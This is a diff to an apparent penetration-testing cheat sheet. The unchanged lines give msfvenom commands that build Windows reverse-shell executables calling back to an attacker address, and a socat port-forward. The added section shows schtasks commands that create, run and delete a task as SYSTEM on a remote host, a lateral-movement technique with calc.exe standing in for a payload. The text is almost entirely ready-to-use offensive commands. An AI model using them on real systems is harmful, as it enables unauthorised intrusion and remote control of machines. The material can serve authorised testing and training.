@@ -542,6 +542,14 @@ Netcat ASP reverse shell (staged): `msfvenom -p windows/shell/reverse_tcp LHOST=
 Netcat reverse shell (unstaged): `msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe > reverse.exe`\
 Netcat reverse shell (staged): `msfvenom -p windows/shell/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe > reverse.exe`\
 
+### Windows scheduled task
+```
+schtasks /create /tn ExampleTask /tr c:\windows\system32\calc.exe /sc once /st 00:00 /S host.domain /RU System
+
+schtasks /run /tn ExampleTask /S host.domain
+
+schtasks /F /delete /tn ExampleTask /S host.domain
+```
 ## Port forwarding/masquerading
 
 SOCAT: `socat TCP-LISTEN:80,fork TCP:192.168.1.1:80`\
